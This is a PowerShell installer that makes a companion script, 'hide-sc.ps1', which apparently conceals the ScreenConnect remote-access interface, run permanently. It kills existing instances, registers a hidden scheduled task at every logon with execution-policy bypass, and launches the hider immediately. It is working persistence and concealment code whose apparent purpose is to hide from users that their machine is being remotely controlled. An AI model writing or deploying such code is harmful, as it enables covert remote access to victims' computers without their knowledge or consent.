# Install ScreenConnect hider permanently (PowerShell only - no .exe build)
$ErrorActionPreference = 'Stop'
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$HideScript = Join-Path $ScriptDir 'hide-sc.ps1'
$TaskName   = 'HideScreenConnectUI'
$LogFile    = Join-Path $env:TEMP 'sc_hide.log'

function Write-Log($msg) {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg" | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

try {
    if (-not (Test-Path -LiteralPath $HideScript)) {
        throw "hide-sc.ps1 not found in $ScriptDir"
    }

    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*hide-sc.ps1*' } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

    schtasks /Delete /TN $TaskName /F 2>$null | Out-Null
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

    $psExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $taskCmd = "`"$psExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$HideScript`""

    # schtasks avoids "No mapping between account names and security IDs" errors
    $st = schtasks /Create /TN $TaskName /TR $taskCmd /SC ONLOGON /F 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Log "schtasks failed: $st"
        $account = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        Register-ScheduledTask `
            -TaskName $TaskName `
            -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$HideScript`"") `
            -Trigger (New-ScheduledTaskTrigger -AtLogOn -User $account) `
            -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) `
            -Description 'Hide ScreenConnect UI' `
            -Force | Out-Null
    }

    Start-Process -FilePath $psExe -ArgumentList '-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', $HideScript -WindowStyle Hidden

    Write-Log 'Installed and started hide-sc.ps1'
    Write-Host ''
    Write-Host 'SUCCESS - Installed permanently.' -ForegroundColor Green
    Write-Host "  Folder : $ScriptDir"
    Write-Host "  Runs at: every Windows login"
    Write-Host ''
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Log : $LogFile"
    exit 1
}
